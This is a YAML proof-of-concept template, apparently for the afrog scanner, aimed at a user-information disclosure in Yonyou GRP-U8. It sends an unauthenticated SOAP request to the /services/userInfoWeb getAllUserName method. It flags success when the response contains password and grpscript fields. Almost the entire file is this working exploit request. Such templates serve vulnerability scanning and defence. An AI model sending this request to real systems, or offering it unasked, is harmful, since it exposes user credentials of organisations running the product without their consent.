pocs/afrog-pocs/vulnerability/yaml-poc-yonyou-yonyou_grp_u8-leak-CT-584461.yml

name: poc-yaml-yonyou-grpu8-userinfoweb-disclosure
binding: db7e03ef-c5ae-4e4e-bcd3-7143dda4b954
manual: true
detail:
    author: y0y0
    links:
        - http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0111399
    vulnerability:
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /services/userInfoWeb
            headers:
                SOAPAction: ' '
            body: |-
                <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
                   <soapenv:Header/>
                   <soapenv:Body>
                      <ser:getAllUserName soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                         <sYear xsi:type="xsd:string">?</sYear>
                      </ser:getAllUserName>
                   </soapenv:Body>
                </soapenv:Envelope>
            follow_redirects: false
        expression: response.status == 200 && response.body_string.startsWith("<?xml") && response.body_string.contains("<password xsi:type") && response.body_string.contains("<grpscript xsi:type")
expression: r0()
